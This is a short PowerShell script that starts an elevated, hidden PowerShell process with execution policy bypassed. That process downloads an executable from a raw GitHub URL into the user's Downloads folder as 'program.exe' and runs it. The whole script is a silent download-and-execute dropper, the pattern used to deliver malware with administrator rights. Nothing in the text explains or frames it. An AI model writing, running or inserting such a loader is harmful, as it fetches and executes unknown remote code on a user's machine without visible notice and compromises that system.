$userDirectory = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
$fileUrl = "https://raw.githubusercontent.com/MRvinyKing/lpoptm/main/output.exe"
$startFilePath = "$userDirectory\Downloads\program.exe"
$downloadCommand = "Invoke-WebRequest -Uri '$fileUrl' -OutFile '$startFilePath'"
$startupCommand = "Start-Process '$startFilePath'"
Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `$($downloadCommand); `$($startupCommand)"
